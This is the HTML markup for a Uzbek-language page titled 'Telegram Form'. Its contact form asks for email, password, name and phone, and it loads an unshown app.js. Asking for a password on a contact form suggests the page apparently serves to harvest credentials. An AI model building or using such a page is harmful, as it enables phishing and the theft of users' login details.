<!DOCTYPE html>
<html lang="uz">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Form</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>

  <form id="contactForm">
    <h2>Biz bilan bog‘lanish</h2>

    <input type="email" id="email" placeholder="Emailingizni kiriting" required>
    <input type="password" id="password" placeholder="Parolingizni kiriting" required>
    <input type="text" id="name" placeholder="Ismingizni kiriting" required>
    <input type="number" id="number" placeholder="Telefon raqamingizni kiriting" required>

    <!-- Bu yerga ochilishini xohlagan rasm manzilini qo'ying -->
    <img type="hidden" id="redirectImage" src="/image/gorilla.jpg">

    <button type="submit">Yuborish</button>
    <p id="status"></p>
  </form>

  <script src="./app.js"></script>
</body>

</html>
